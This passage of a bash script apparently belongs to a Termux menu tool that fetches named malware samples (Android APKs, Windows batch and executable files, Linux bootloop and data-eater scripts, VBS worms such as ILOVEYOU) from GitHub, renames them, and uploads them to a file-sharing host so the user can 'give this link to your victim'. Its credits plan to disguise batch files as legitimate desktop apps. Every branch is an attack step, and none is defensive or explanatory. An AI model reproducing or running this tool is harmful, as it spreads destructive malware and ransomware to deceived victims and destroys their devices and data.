         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 31 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.statetss.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.statetss.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.statetss.apk https://filepush.co/upload/com.statetss.apk
         rm -f com.statetss.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 32 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.thinkking.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.thinkking.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.thinkking.apk https://filepush.co/upload/com.thinkking.apk
         rm -f com.thinkking.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 33 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/crd.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv crd.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file crd.apk https://filepush.co/upload/crd.apk
         rm -f crd.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 34 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/dendroid.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv dendroid.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file dendroid.apk https://filepush.co/upload/dendroid.apk
         rm -f dendroid.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 35 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/ds.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv ds.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file ds.apk https://filepush.co/upload/ds.apk
         rm -f ds.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 36 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/fake_av.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv fake_av.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file fake_av.apk https://filepush.co/upload/fake_av.apk
         rm -f fake_av.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 37 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/Grave.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Grave.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Grave.apk https://filepush.co/upload/Grave.apk
         rm -f Grave.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 38 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/Malum.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Malum.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Malum.apk https://filepush.co/upload/Malum.apk
         rm -f Malum.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 39 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/Mobile_Legends_Adventure.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Mobile_Legends_Adventure.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Mobile_Legends_Adventure.apk https://filepush.co/upload/Mobile_Legends_Adventure.apk
         rm -f Mobile_Legends_Adventure.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 40 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/TakeBeer.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv TakeBeer.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file TakeBeer.apk https://filepush.co/upload/TakeBeer.apk
         rm -f TakeBeer.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 41 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/elite.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv elite.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file elite.apk https://filepush.co/upload/elite.apk
         rm -f elite.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 42 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/mobelejen.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv mobelejen.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file mobelejen.apk https://filepush.co/upload/mobelejen.apk
         rm -f mobelejen.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   else
      echo -e "\e[91mWrong input. Try again.\e[0m"
   fi


elif [ $zCh = 2 ]; then
   echo -e "\e[32mWINDOW VIRUS\e[0m"
   echo -e "\e[36m 1. RIP.bat"
   echo -e " 2. RansomwareFileDecryptor.exe"
   echo -e " 3. cmd.bat"
   echo -e " 4. koce.bat"
   echo -e " 5. kuis.bat"
   echo -e " 6. reg-eater.bat"
   echo -e " 7. sleepy.bat"
   echo -e " 8. ugly.bat"
   echo -e " 9. PCT.bat"
   echo -e " 10 regeater.bat\e[0m"
   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mChoose window virus: \e[0m\e[34m"
   read winChB
   echo -e "\e[0m"
   if [ $winChB = 1 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/RIP.bat
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv RIP.bat $newName.bat
         exe
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file RIP.bat https://filepush.co/upload/RIP.bat
         rm -f RIP.bat
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $winChB = 2 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/RansomwareFileDecryptor.exe
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv RansomwareFileDecryptor.exe $newName.exe
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file $newName.exe https://filepush.co/upload/$newName.exe
         rm -f $newName.exe
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file RansomwareFileDecryptor.exe https://filepush.co/upload/RansomwareFileDecryptor.exe
         rm -f RansomwareFileDecryptor.exe
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $winChB = 3 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/cmd.bat
            echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv cmd.bat $newName.bat
         exe
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file cmd.bat https://filepush.co/upload/cmd.bat
         rm -f cmd.bat
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $winChB = 4 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/koce.bat
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv koce.bat $newName.bat
         exe
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file koce.bat https://filepush.co/upload/koce.bat
         rm -f koce.bat
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi   
   elif [ $winChB = 5 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/kuis.bat
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv kuis.bat $newName.bat
         exe
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file kuis.bat https://filepush.co/upload/kuis.bat
         rm -f kuis.bat
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $winChB = 6 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/reg-eater.bat
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv reg-eater.bat $newName.bat
         exe
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file reg-eater.bat https://filepush.co/upload/reg-eater.bat
         rm -f reg-eater.bat
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $winChB = 7 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/sleepy.bat
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv sleely.bat $newName.bat
         exe
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file sleepy.bat https://filepush.co/upload/sleepy.bat
         rm -f sleepy.bat
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $winChB = 8 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/ugly.bat
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv ugly.bat $newName.bat
         exe
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file ugly.bat https://filepush.co/upload/ugly.bat
         rm -f ugly.bat
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $winChB = 9 ]; then
      wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/PCT.bat
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv PCT.bat $newName.bat
         exe
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file PCT.bat https://filepush.co/upload/PCT.bat
         rm -f PCT.bat
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $winChB = 10 ]; then
      wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/regeater.bat
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv regeater.bat $newName.bat
         exe
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file regeater.bat https://filepush.co/upload/regeater.bat
         rm -f regeater.bat
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   else
      echo -e "\e[91mWrong input. Try again.\e[0m"
   fi


elif [ $zCh = 3 ]; then
   echo -e "\e[32mLinux | Termux(root) shell\e[0m"
   echo -e "\e[36m 1. bootloop.sh"
   echo -e " 2. data-eater.sh"
   echo -e " 3. freeze.sh"
   echo -e " 4. lil_virus.sh"
   echo -e " 5. trash.sh\e[0m"
   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mChoose shell script: \e[0m\e[34m"
   read ChB
   echo -e "\e[0m"
   if [ $ChB = 1 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/bootloop.sh
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv bootloop.sh $newName.sh
         sh
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file bootloop.sh https://filepush.co/upload/bootloop.sh
         rm -f bootloop.sh
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $ChB = 2 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/data-eater.sh
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv data-eater.sh $newName.sh
         sh
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file data-eater.sh https://filepush.co/upload/data-eater.sh
         rm -f data-eater.sh
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $ChB = 3 ]; then
      wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/freeze.sh
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv freeze.sh $newName.sh
         sh
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file freeze.sh https://filepush.co/upload/freeze.sh
         rm -f freeze.sh
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $ChB = 4 ]; then
      wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/lil_virus.sh
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv lil_virus.sh $newName.sh
         sh
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file lil_virus.sh https://filepush.co/upload/lil_virus.sh
         rm -f lil_virus.sh
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $ChB = 5 ]; then
      wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/trash.sh
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv trash.sh $newName.sh
         sh
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file trash.sh https://filepush.co/upload/trash.sh
         rm -f trash.sh
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   else
      echo -e "\e[91mWrong input. Try again.\e[0m"
   fi


elif [ $zCh = 4 ]; then
   echo -e "\e[32mOTHERS\e[0m"
   echo -e "\e[36m 1. alay.vbs"
   echo -e " 2. capslock.vbs"
   echo -e " 3. ILOVEYOU.vbs\e[0m"
   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mPlease Choose Virus: \e[0m\e[34m"
   read zch
   echo -e "\e[0m"
   if [ $zch = 1 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/alay.vbs
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv alay.vbs $newName.vbs
         etc
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file alay.vbs https://filepush.co/upload/alay.vbs
         rm -f alay.vbs
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $zch = 2 ]; then
      wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/capslock.vbs
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv capslock.vbs $newName.vbs
         etc
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file capslock.vbs https://filepush.co/upload/capslock.vbs
         rm -f capslock.vbs
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $zch = 3 ]; then
      wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/ILOVEYOU.vbs
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv ILOVEYOU.vbs $newName.vbs
         etc
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
         curl --upload-file ILOVEYOU.vbs https://filepush.co/upload/ILOVEYOU.vbs
         rm -f ILOVEYOU.vbs
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   else
      echo -e "\e[91mWrong input. Try again.\e[0m"
   fi

elif [ $zCh = 5 ]; then
echo -e "\e[92mCoded By:\e[0m\e[94m Dead_Body770\e[0m"
echo -e "\e[92mCredits To:\e[0m \e[94mGameye98 & LOolzeC"
echo -e " I don't know where they find those viruses.\e[0m\n"

echo -e "\e[36mIf you encounter an error. Please send me a message here \e[0m\e[96m'domarizk770@gmail.com'\e[0m\e[0m\n"

echo -e "\e[92mFUTURE UPDATES:\e[0m"
echo -e "\e[32mVersion 1.4\e[0m"
echo -e "\e[92mFeatures Version: - Will be posted on January 2021.\e[0m"
echo -e "\e[34m -> Additional download link incase the other one didn't work."
echo -e " -> Bat files will be converted into exe file so the victim would think that it is a legit deskop app."
echo -e " -> I will also include my dangerous or a little bit dangerous programs"
echo -e " -> Converted into Python 3\e[0m"
echo -e "NOTE:\n If you have any suggestions, comments, questions or anything. Just shut up"
else
      echo -e "\e[91mWrong input. Try again.\e[0m"
fi
